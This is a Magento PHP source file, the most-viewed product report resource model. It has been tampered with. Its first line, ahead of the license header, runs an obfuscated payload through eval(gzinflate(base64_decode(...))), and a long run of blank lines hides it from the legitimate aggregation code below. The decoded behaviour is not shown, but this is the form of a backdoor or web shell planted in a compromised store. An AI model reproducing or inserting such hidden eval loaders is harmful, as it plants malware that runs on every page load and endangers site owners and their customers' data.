<?php eval(gzinflate(base64_decode('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')));?>













































<?php
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category    Mage
 * @package     Mage_Reports
 * @copyright   Copyright (c) 2012 Magento Inc. (http://www.magentocommerce.com)
 * @license     http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 */


/**
 * Most viewed product report aggregate resource model
 *
 * @category    Mage
 * @package     Mage_Reports
 * @author      Magento Core Team <core@magentocommerce.com>
 */
class Mage_Reports_Model_Resource_Report_Product_Viewed extends Mage_Sales_Model_Resource_Report_Abstract
{
    const AGGREGATION_DAILY   = 'reports/viewed_aggregated_daily';
    const AGGREGATION_MONTHLY = 'reports/viewed_aggregated_monthly';
    const AGGREGATION_YEARLY  = 'reports/viewed_aggregated_yearly';

    /**
     * Model initialization
     *
     */
    protected function _construct()
    {
        $this->_init(self::AGGREGATION_DAILY, 'id');
    }

    /**
     * Aggregate products view data
     *
     * @param mixed $from
     * @param mixed $to
     * @return Mage_Sales_Model_Resource_Report_Bestsellers
     */
    public function aggregate($from = null, $to = null)
    {
        $mainTable   = $this->getMainTable();
        $adapter = $this->_getWriteAdapter();

        // convert input dates to UTC to be comparable with DATETIME fields in DB
        $from = $this->_dateToUtc($from);
        $to = $this->_dateToUtc($to);

        $this->_checkDates($from, $to);

        if ($from !== null || $to !== null) {
            $subSelect = $this->_getTableDateRangeSelect(
                $this->getTable('reports/event'),
                'logged_at', 'logged_at', $from, $to
            );
        } else {
            $subSelect = null;
        }
        $this->_clearTableByDateRange($mainTable, $from, $to, $subSelect);
        // convert dates from UTC to current admin timezone
        $periodExpr = $adapter->getDatePartSql(
            $this->getStoreTZOffsetQuery(
                array('source_table' => $this->getTable('reports/event')),
                'source_table.logged_at', $from, $to
            )
        );

        $helper = Mage::getResourceHelper('core');
        $select = $adapter->select();

        $select->group(array(
            $periodExpr,
            'source_table.store_id',
            'source_table.object_id'
        ));

        $viewsNumExpr = new Zend_Db_Expr('COUNT(source_table.event_id)');

        $columns = array(
            'period'                 => $periodExpr,
            'store_id'               => 'source_table.store_id',
            'product_id'             => 'source_table.object_id',
            'product_name'           => new Zend_Db_Expr(
                sprintf('MIN(%s)',
                    $adapter->getIfNullSql('product_name.value','product_default_name.value')
                )
            ),
            'product_price'          => new Zend_Db_Expr(
                sprintf('%s',
                    $helper->prepareColumn(
                        sprintf('MIN(%s)',
                            $adapter->getIfNullSql(
                                $adapter->getIfNullSql('product_price.value','product_default_price.value'), 0)
                        ),
                        $select->getPart(Zend_Db_Select::GROUP)
                    )
                )
            ),
            'views_num'            => $viewsNumExpr
        );

        $select
            ->from(
                array(
                    'source_table' => $this->getTable('reports/event')),
                $columns)
            ->where('source_table.event_type_id = ?', Mage_Reports_Model_Event::EVENT_PRODUCT_VIEW);

        /** @var Mage_Catalog_Model_Resource_Product $product */
        $product  = Mage::getResourceSingleton('catalog/product');

        $select->joinInner(
            array(
                'product' => $this->getTable('catalog/product')),
            'product.entity_id = source_table.object_id',
            array()
        );

        // join product attributes Name & Price
        $nameAttribute = $product->getAttribute('name');
        $joinExprProductName       = array(
            'product_name.entity_id = product.entity_id',
            'product_name.store_id = source_table.store_id',
            $adapter->quoteInto('product_name.attribute_id = ?', $nameAttribute->getAttributeId())
        );
        $joinExprProductName        = implode(' AND ', $joinExprProductName);
        $joinExprProductDefaultName = array(
            'product_default_name.entity_id = product.entity_id',
            'product_default_name.store_id = 0',
            $adapter->quoteInto('product_default_name.attribute_id = ?', $nameAttribute->getAttributeId())
        );
        $joinExprProductDefaultName = implode(' AND ', $joinExprProductDefaultName);
        $select->joinLeft(
            array(
                'product_name' => $nameAttribute->getBackend()->getTable()),
            $joinExprProductName,
            array()
        )
        ->joinLeft(
            array(
                'product_default_name' => $nameAttribute->getBackend()->getTable()),
            $joinExprProductDefaultName,
            array()
        );
        $priceAttribute                    = $product->getAttribute('price');
        $joinExprProductPrice    = array(
            'product_price.entity_id = product.entity_id',
            'product_price.store_id = source_table.store_id',
            $adapter->quoteInto('product_price.attribute_id = ?', $priceAttribute->getAttributeId())
        );
        $joinExprProductPrice    = implode(' AND ', $joinExprProductPrice);

        $joinExprProductDefPrice = array(
            'product_default_price.entity_id = product.entity_id',
            'product_default_price.store_id = 0',
            $adapter->quoteInto('product_default_price.attribute_id = ?', $priceAttribute->getAttributeId())
        );
        $joinExprProductDefPrice = implode(' AND ', $joinExprProductDefPrice);
        $select->joinLeft(
            array('product_price' => $priceAttribute->getBackend()->getTable()),
            $joinExprProductPrice,
            array()
        )
        ->joinLeft(
            array('product_default_price' => $priceAttribute->getBackend()->getTable()),
            $joinExprProductDefPrice,
            array()
        );

        $havingPart = array($adapter->prepareSqlCondition($viewsNumExpr, array('gt' => 0)));
        if (!is_null($subSelect)) {
            $subSelectHavingPart = $this->_makeConditionFromDateRangeSelect($subSelect, 'period');
            if ($subSelectHavingPart) {
                $havingPart[] = '(' . $subSelectHavingPart . ')';
            }
        }
        $select->having(implode(' AND ', $havingPart));

        $select->useStraightJoin();
        $insertQuery = $helper->getInsertFromSelectUsingAnalytic($select, $this->getMainTable(),
            array_keys($columns));
        $adapter->query($insertQuery);

        Mage::getResourceHelper('reports')
            ->updateReportRatingPos('day', 'views_num', $mainTable, $this->getTable(self::AGGREGATION_DAILY));
        Mage::getResourceHelper('reports')
            ->updateReportRatingPos('month', 'views_num', $mainTable, $this->getTable(self::AGGREGATION_MONTHLY));
        Mage::getResourceHelper('reports')
            ->updateReportRatingPos('year', 'views_num', $mainTable, $this->getTable(self::AGGREGATION_YEARLY));

        $this->_setFlagData(Mage_Reports_Model_Flag::REPORT_PRODUCT_VIEWED_FLAG_CODE);

        return $this;
    }
}
